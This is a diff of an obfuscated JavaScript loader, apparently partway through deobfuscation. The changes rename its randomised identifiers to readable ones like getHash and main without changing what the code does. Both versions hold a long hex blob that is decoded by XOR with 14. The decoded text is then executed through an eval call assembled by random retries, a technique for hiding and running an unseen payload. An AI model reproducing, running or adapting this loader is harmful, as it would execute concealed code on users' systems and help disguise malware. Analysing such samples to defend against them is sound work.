@@ -1,19 +1,19 @@
-function vjfumaorll(fjhmmvbhgv)
+function vjfumaorll(hash)
 {
-	return parseInt(fjhmmvbhgv.substr(3,2),16);
+	return parseInt(hash.substr(3,2),16);
 }
-function ffyshboqha(fxpjdgzjeq,doxntgsbyf){
-	return fxpjdgzjeq^doxntgsbyf;
+function ffyshboqha(a,b){
+	return a ^ b; //Bitwise XOR
 }
 function liovbrleki()
 {
-	var skvmcimodv=new Array("d","e","v","a","l","^");
-	return skvmcimodv[Math["floo"+""+"r"](Math.random()*skvmcimodv.length)];
+	var chars = new Array("d","e","v","a","l","^");
+	return chars[Math["floo"+""+"r"](Math.random()*chars.length)];
 }
-function muztwjozhf()
+function getHash()
 {
 	var i = 1;
-	var hgqwcctfaw="e3968ea97bf6360fe76da797af5667cff61f2160a202eabb69a0f6bf997ab6d4ac2d6ff447abf96fd5848d197cd2061a2663e5e5bfe97cb4d62a0e26e737bbb17cf7562be622f882eca96df9c6ff5b62b9f62aa96ca0f6fbba6db8165d0e27e6875cb27a"+
+	var hash = "e3968ea97bf6360fe76da797af5667cff61f2160a202eabb69a0f6bf997ab6d4ac2d6ff447abf96fd5848d197cd2061a2663e5e5bfe97cb4d62a0e26e737bbb17cf7562be622f882eca96df9c6ff5b62b9f62aa96ca0f6fbba6db8165d0e27e6875cb27a"+
 	"e7a7cf2f77c6775c7178e7a6ffa67ccdd2ec7876c6c63ea862a0f46d4e7ada67ae1b7ead32efac33a2a2ee9260be76baf279dfa2ec0f4fc306df307ac3767dd278cf36bacb56a2b41d306cdc964b436bba56df877abf026f982cee643ae25df2456c0743"+
 	"a4342d963cfb120a8856cc743a9e42d6f46e6f5ae215ab005edbd2cf6627a3135a4876db563acc62e5246e387af307af647ecff20b0561da77efc06bb6560c7226b762cc5949e2b4bcf15ad7e2cda922f642eb1e7bf567cabb62ae222d572ea3968f086f"+
 	"f4d62fc97dc0d6bdcf27d0335ead76dcc63f5262b6446f3c7abe17aabc7ed2720ca47db4c6bc2860bc56aa0026ace27b8235aa167abc68e4f2eb0926ddb76b4d63f7a62a7446d8e7adc87add37efed20dd27dc3a7aea96ffeb7adb27bbc97dc712ecec33"+
@@ -55,21 +55,22 @@ function muztwjozhf()
 	"dec26b8b7ef3b6fb327aa0666b4d22ef82efad6ba5f7cc8b7ce3b61f837cc5627a982ebb275de567cd368eac2efc126d292fceb6baa37cb277cd4e61a7a7cae027c7875d537ac1f7cc0177ee175f2a78e6b6fbff7cbe62ee3679d9c7de3166a912eaea33"+
 	"aea2eaab60f916bcde79c2e2efe24fa9a6de9c7aea667aa678fb66bcc156a9941ae66ca6764a376ba5e6df487ad3226e4c2cbf959d555dd6d6db9c7cda367ab67ecd07acac20f5e5de4366f916bb3662ddb62c242caad27ca035d2879b837da5766e4a20"+
 	"ae45ca377bcb460b1626c4e7eb9a6fe4b7ab8466c8927e7c35d9b73fbf6da406fc7a7afdd6df3766b102ea6126bc86beaf7cd487cce361b377cf9c27c502ebec75d5c73b6273baf73f9027f3c35a9c73bbe73f9927cec35";
-	return hgqwcctfaw;
+	return hash;
 }
-function snbelvskwd(ynrlyerfuv)
+
+function main(ynrlyerfuv)
 {
-	var pcframdtbt;
+	var re;
 	while(true){
 		try
 		{
-			pcframdtbt=(new Function("mliohtsiue","var hltxbtlnyx=mliohtsiue.match(/\\S{5}/g),mndjlyeorw=\"\",orxhspxbkw=0;while(orxhspxbkw<hltxbtlnyx.length){mndjlyeorw+=Str"+"ing['fromCharCode'](vjfumaorll(hltxbtlnyx[orxhspxbkw])"+liovbrleki()+"14);orxhspxbkw++;}"+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);")(ynrlyerfuv));
+			result=(new Function("mliohtsiue","var hltxbtlnyx=mliohtsiue.match(/\\S{5}/g),mndjlyeorw=\"\",orxhspxbkw=0;while(orxhspxbkw<hltxbtlnyx.length){mndjlyeorw+=Str"+"ing['fromCharCode'](vjfumaorll(hltxbtlnyx[orxhspxbkw])"+liovbrleki()+"14);orxhspxbkw++;}"+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);")(ynrlyerfuv));
 			break;
 		}
 		catch(er)
 		{
 		}
 	}
-	return pcframdtbt;
+	return result;
 }
-snbelvskwd(muztwjozhf());
+main(getHash());
